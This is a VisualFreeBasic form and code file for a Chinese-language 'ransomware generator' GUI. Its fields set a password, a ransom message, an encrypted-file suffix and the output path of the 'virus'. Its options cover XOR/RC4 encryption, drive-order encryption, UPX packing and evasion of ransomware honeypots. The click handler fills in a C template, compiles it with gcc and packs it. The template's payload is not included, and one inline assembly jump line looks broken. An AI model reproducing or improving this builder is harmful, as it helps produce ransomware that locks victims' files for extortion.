#VisualFreeBasic_Form#  Version=5.4.5
Locked=0

[Form]
Name=mv
ClassStyle=CS_VREDRAW,CS_HREDRAW,CS_DBLCLKS
ClassName=
WinStyle=WS_THICKFRAME,WS_CAPTION,WS_SYSMENU,WS_MINIMIZEBOX,WS_MAXIMIZEBOX,WS_CLIPSIBLINGS,WS_CLIPCHILDREN,WS_VISIBLE,WS_EX_WINDOWEDGE,WS_EX_CONTROLPARENT,WS_EX_LEFT,WS_EX_LTRREADING,WS_EX_RIGHTSCROLLBAR,WS_POPUP,WS_SIZEBOX
Style=3 - 常规窗口
Icon=
Caption=勒索病毒生成器 v1.1 [2020年母亲节快乐 ：-]
StartPosition=1 - 屏幕中心
WindowState=0 - 正常
Enabled=True
Repeat=False
Left=0
Top=0
Width=598
Height=325
TopMost=False
Child=False
MdiChild=False
TitleBar=True
SizeBox=True
SysMenu=True
MaximizeBox=True
MinimizeBox=True
Help=False
Hscroll=False
Vscroll=False
MinWidth=0
MinHeight=0
MaxWidth=0
MaxHeight=0
NoActivate=False
MousePass=False
TransPer=0
TransColor=SYS,25
Shadow=0 - 无阴影
BackColor=SYS,15
MousePointer=0 - 默认
Tag=
Tab=True
ToolTip=
ToolTipBalloon=False
AcceptFiles=False

[Frame]
Name=Frame2
Index=-1
Caption=Type
TextAlign=0 - 左对齐
Fillet=5
BorderWidth=1
BorderColor=SYS,16
ForeColor=SYS,8
BackColor=SYS,25
Enabled=True
Visible=True
Font=微软雅黑,9,0
Left=156
Top=5
Width=426
Height=143
Layout=0 - 不锚定
MousePointer=0 - 默认
Tag=
ToolTip=
ToolTipBalloon=False

[CheckBox]
Name=Check1
Index=-1
Style=0 - 标准
Caption=O3优化
TextAlign=3 - 中左对齐
Alignment=0 - 文本在左边
Value=0 - 未选择
Multiline=True
Enabled=True
Visible=True
ForeColor=SYS,8
BackColor=SYS,25
Font=Tahoma,9,0
Left=17
Top=64
Width=83
Height=27
Layout=0 - 不锚定
MousePointer=0 - 默认
Tag=
Tab=True
ToolTip=
ToolTipBalloon=False
AcceptFiles=False

[TextBox]
Name=Text1
Index=-1
Style=3 - 凹边框
TextScrollBars=0 - 无滚动条
Text=
Enabled=True
Visible=True
MaxLength=0
ForeColor=SYS,8
BackColor=SYS,5
Font=Tahoma,9,0
TextAlign=0 - 左对齐
PasswordChar=
Locked=False
HideSelection=True
Multiline=False
Uppercase=False
Lowercase=False
Number=False
AutoHScroll=True
AutoVScroll=False
Left=169
Top=45
Width=403
Height=22
Layout=0 - 不锚定
MousePointer=0 - 默认
Tag=
Tab=True
ToolTip=
ToolTipBalloon=False
LeftMargin=0
RightMargin=0
AcceptFiles=False

[TextBox]
Name=Text2
Index=-1
Style=3 - 凹边框
TextScrollBars=0 - 无滚动条
Text=
Enabled=True
Visible=True
MaxLength=0
ForeColor=SYS,8
BackColor=SYS,5
Font=Tahoma,9,0
TextAlign=0 - 左对齐
PasswordChar=
Locked=False
HideSelection=True
Multiline=False
Uppercase=False
Lowercase=False
Number=False
AutoHScroll=True
AutoVScroll=False
Left=198
Top=115
Width=84
Height=24
Layout=0 - 不锚定
MousePointer=0 - 默认
Tag=
Tab=True
ToolTip=
ToolTipBalloon=False
LeftMargin=0
RightMargin=0
AcceptFiles=False

[TextBox]
Name=Text3
Index=-1
Style=3 - 凹边框
TextScrollBars=0 - 无滚动条
Text=xbck
Enabled=True
Visible=True
MaxLength=0
ForeColor=SYS,8
BackColor=SYS,5
Font=Tahoma,9,0
TextAlign=0 - 左对齐
PasswordChar=
Locked=False
HideSelection=True
Multiline=False
Uppercase=False
Lowercase=False
Number=False
AutoHScroll=True
AutoVScroll=False
Left=356
Top=113
Width=219
Height=28
Layout=0 - 不锚定
MousePointer=0 - 默认
Tag=
Tab=True
ToolTip=
ToolTipBalloon=False
LeftMargin=0
RightMargin=0
AcceptFiles=False

[CheckBox]
Name=Check2
Index=-1
Style=0 - 标准
Caption=upx压缩
TextAlign=3 - 中左对齐
Alignment=0 - 文本在左边
Value=0 - 未选择
Multiline=True
Enabled=True
Visible=True
ForeColor=SYS,8
BackColor=SYS,25
Font=Tahoma,9,0
Left=16
Top=86
Width=70
Height=25
Layout=0 - 不锚定
MousePointer=0 - 默认
Tag=
Tab=True
ToolTip=
ToolTipBalloon=False
AcceptFiles=False

[Label]
Name=Label1
Index=-1
Style=0 - 无边框
Caption=gcc编译器路径（gcc.exe）
Enabled=True
Visible=True
ForeColor=SYS,8
BackColor=SYS,25
Font=Tahoma,9,0
TextAlign=0 - 左对齐
Prefix=True
Ellipsis=False
Left=165
Top=25
Width=154
Height=20
Layout=0 - 不锚定
MousePointer=0 - 默认
Tag=
ToolTip=
ToolTipBalloon=False

[Label]
Name=Label2
Index=-1
Style=0 - 无边框
Caption=密码
Enabled=True
Visible=True
ForeColor=SYS,8
BackColor=SYS,25
Font=Tahoma,9,0
TextAlign=0 - 左对齐
Prefix=True
Ellipsis=False
Left=162
Top=119
Width=28
Height=26
Layout=0 - 不锚定
MousePointer=0 - 默认
Tag=
ToolTip=
ToolTipBalloon=False

[Label]
Name=Label3
Index=-1
Style=0 - 无边框
Caption=加密后缀名
Enabled=True
Visible=True
ForeColor=SYS,8
BackColor=SYS,25
Font=Tahoma,9,0
TextAlign=0 - 左对齐
Prefix=True
Ellipsis=False
Left=289
Top=119
Width=99
Height=22
Layout=0 - 不锚定
MousePointer=0 - 默认
Tag=
ToolTip=
ToolTipBalloon=False

[TextBox]
Name=Text4
Index=-1
Style=3 - 凹边框
TextScrollBars=0 - 无滚动条
Text=加密完成后的提示信息
Enabled=True
Visible=True
MaxLength=0
ForeColor=SYS,8
BackColor=SYS,5
Font=Tahoma,9,0
TextAlign=0 - 左对齐
PasswordChar=
Locked=False
HideSelection=True
Multiline=False
Uppercase=False
Lowercase=False
Number=False
AutoHScroll=True
AutoVScroll=False
Left=177
Top=82
Width=396
Height=22
Layout=0 - 不锚定
MousePointer=0 - 默认
Tag=
Tab=True
ToolTip=
ToolTipBalloon=False
LeftMargin=0
RightMargin=0
AcceptFiles=False

[Button]
Name=Command1
Index=-1
Caption=开始生成
Enabled=True
Visible=True
Default=False
OwnDraw=False
MultiLine=False
Font=Tahoma,9,0
Left=12
Top=214
Width=569
Height=67
Layout=0 - 不锚定
MousePointer=0 - 默认
Tag=
Tab=True
ToolTip=
ToolTipBalloon=False

[TextBox]
Name=Text5
Index=-1
Style=3 - 凹边框
TextScrollBars=0 - 无滚动条
Text=生成病毒的路径
Enabled=True
Visible=True
MaxLength=0
ForeColor=SYS,8
BackColor=SYS,5
Font=Tahoma,9,0
TextAlign=0 - 左对齐
PasswordChar=
Locked=False
HideSelection=True
Multiline=False
Uppercase=False
Lowercase=False
Number=False
AutoHScroll=True
AutoVScroll=False
Left=11
Top=168
Width=565
Height=36
Layout=0 - 不锚定
MousePointer=0 - 默认
Tag=
Tab=True
ToolTip=
ToolTipBalloon=False
LeftMargin=0
RightMargin=0
AcceptFiles=False

[Option]
Name=Option1
Index=-1
Style=0 - 标准
Caption=RC4加密
TextAlign=3 - 中左对齐
Alignment=0 - 文本在左边
Value=0 - 未选择
Multiline=True
GroupName=OptionGroup1
Enabled=False
Visible=True
ForeColor=SYS,8
BackColor=SYS,25
Font=Tahoma,9,0
Left=339
Top=25
Width=76
Height=15
Layout=0 - 不锚定
MousePointer=0 - 默认
Tag=
Tab=True
ToolTip=加密速度较快，安全性高
ToolTipBalloon=False
AcceptFiles=False

[Option]
Name=Option2
Index=-1
Style=0 - 标准
Caption=Xor加密
TextAlign=3 - 中左对齐
Alignment=0 - 文本在左边
Value=0 - 未选择
Multiline=True
GroupName=OptionGroup1
Enabled=True
Visible=True
ForeColor=SYS,8
BackColor=SYS,25
Font=Tahoma,9,0
Left=447
Top=26
Width=89
Height=18
Layout=0 - 不锚定
MousePointer=0 - 默认
Tag=
Tab=True
ToolTip=加密速度极快，安全性较低，容易被破解
ToolTipBalloon=False
AcceptFiles=False

[CheckBox]
Name=Check3
Index=-1
Style=0 - 标准
Caption=最小体积
TextAlign=3 - 中左对齐
Alignment=0 - 文本在左边
Value=0 - 未选择
Multiline=True
Enabled=True
Visible=True
ForeColor=SYS,8
BackColor=SYS,25
Font=微软雅黑,9,0
Left=17
Top=44
Width=79
Height=21
Layout=0 - 不锚定
MousePointer=0 - 默认
Tag=
Tab=True
ToolTip=
ToolTipBalloon=False
AcceptFiles=False

[CheckBox]
Name=Check4
Index=-1
Style=0 - 标准
Caption=倒序盘符加密
TextAlign=3 - 中左对齐
Alignment=0 - 文本在左边
Value=0 - 未选择
Multiline=True
Enabled=True
Visible=True
ForeColor=SYS,8
BackColor=SYS,25
Font=微软雅黑,9,0
Left=16
Top=25
Width=105
Height=17
Layout=0 - 不锚定
MousePointer=0 - 默认
Tag=
Tab=True
ToolTip=
ToolTipBalloon=False
AcceptFiles=False

[Frame]
Name=Frame1
Index=-1
Caption=Setting
TextAlign=0 - 左对齐
Fillet=5
BorderWidth=1
BorderColor=SYS,16
ForeColor=SYS,8
BackColor=SYS,25
Enabled=True
Visible=True
Font=微软雅黑,9,0
Left=3
Top=5
Width=141
Height=148
Layout=0 - 不锚定
MousePointer=0 - 默认
Tag=
ToolTip=
ToolTipBalloon=False

[CheckBox]
Name=Check5
Index=-1
Style=0 - 标准
Caption=反部分勒索诱捕
TextAlign=3 - 中左对齐
Alignment=0 - 文本在左边
Value=0 - 未选择
Multiline=True
Enabled=True
Visible=True
ForeColor=SYS,8
BackColor=SYS,25
Font=微软雅黑,9,0
Left=17
Top=111
Width=112
Height=24
Layout=0 - 不锚定
MousePointer=0 - 默认
Tag=
Tab=True
ToolTip=
ToolTipBalloon=False
AcceptFiles=False

[VEH]
Name=VEH1
Left=137
Top=121
Tag=


[AllCode]
'优化是标准的工程模版，你也可做自己的模版。
'写好工程，复制全部文件到VFB软件文件夹里【template】里即可，子文件夹名为 VFB新建工程里显示的名称
'快去打造属于你自己的工程模版吧。

Sub mv_Command1_BN_Clicked(hWndForm As hWnd, hWndControl As hWnd)  '单
Asm jmp $-120000000000000000
     if Dir(App.Path + "\\bin\\upx.exe") = "" then
      MessageBox NULL, "无压缩器！！！", "error", 16
      exit sub
   End if
   if Dir(App.Path + "\\bin\\1.c") = "" then
      MessageBox NULL, "无 1.c ", "error", 16
      exit sub
   End if
   if len(Text1.text) = 0 then
      MessageBox NULL, "编译器不存在！！！", "error", 16
      exit sub
   End if
   Dim _data As String
   Dim buffer As String
   
   if Option1.Value = True then
      Open App.Path + "\\bin\\1.C" For Input As #1
   Else
        Open App.Path + "\\bin\\1.C" For Input As #1
   End if
   Do While Not EOF(1)
      Line Input #1, buffer
      _data = _data + buffer + vbcrlf
   Loop
   Close #1
   _data = ReplaceASM(ReplaceASM(ReplaceASM(ReplaceASM( _data, ",4)", "," + str(len(Text3.text)) + ")"), "CX+*FBHSF+/HBSF", text2.text), "宁的电脑被黑了（手动滑稽）", text4.text), "bck2", text3.text)
   if len(Dir(Environ("temp") + "\\6.c")) <> 0 then
      DeleteFileA Environ("temp") + "\\6.c"
   End if
   open Environ("temp") + "\\6.c" for output as #1
   print #1, _data
   close #1
   Dim a as string
   if Check1.Value = true Then
      a = " -O3"
   Else
      a = " -O1"
   End if
   Shell Text1.Text + " " + A + " -std=gnu99 -mwindows """ + Environ("temp") +"\"+ "6.c"" " + "-o " + """" + Text5.TEXT + """"
   Dim t As String = Text5.text
   Text5.Text = Text1.Text + " " + A + " -std=gnu99 -mwindows """ + Environ("temp") + "\"+"6.c"" " + "-o " + """" + Text5.TEXT + """"
   if Check2.Value = true Then
      Sleep 3500
      Shell App.Path + "\\bin\\upx.exe " + """" + t + """"
      Text5.Text = App.Path + "\\bin\\upx.exe " + """" + t + """"
   End if
End Sub

Sub mv_WM_Create(hWndForm As hWnd,UserData As Integer)  '完成创建窗口及所有的控件后，此时窗口还未显示。注：自定义消息里 WM_Create 此时还未创建控件和初始赋值。
   Option2.Value = True

End Sub

Sub mv_Command2_BN_Clicked(hWndForm As hWnd, hWndControl As hWnd)  '单击
   
End Sub

Sub mv_Check3_BN_Clicked(hWndForm As hWnd, hWndControl As hWnd)  '单击
   if Check3.Value = True then
      Check1.Value=False
      check1.Enabled =false
   else
      
      check1.Enabled =  True
      end if
End Sub


Sub mv_Check1_BN_Clicked(hWndForm As hWnd, hWndControl As hWnd)  '单击
  if Check1.Value = True then
      Check3.Value=False
      check3.Enabled =false
   else
      
      check3.Enabled =  True
      end if
End Sub

Function mv_VEH1_VectExcepHandler(ByRef excp As EXCEPTION_POINTERS)As Integer  '向量化异常处理（程序崩溃后处理）


   
   Return -1  '告诉系统接下来如何做
   'EXCEPTION_EXECUTE_HANDLER     1 表示我已经处理了异常,可以结束了，软件立即结束
   'EXCEPTION_CONTINUE_SEARCH     0 表示我不处理,其他人来吧,于是windows 默认提示软件崩溃（系统未注册调试器的不提示，直接结束）
   'EXCEPTION_CONTINUE_EXECUTION -1 表示错误已经被修复,请从 excp.ContextRecord->Eip 地址继续执行  64位是 excp.ContextRecord->Rip

End Function






























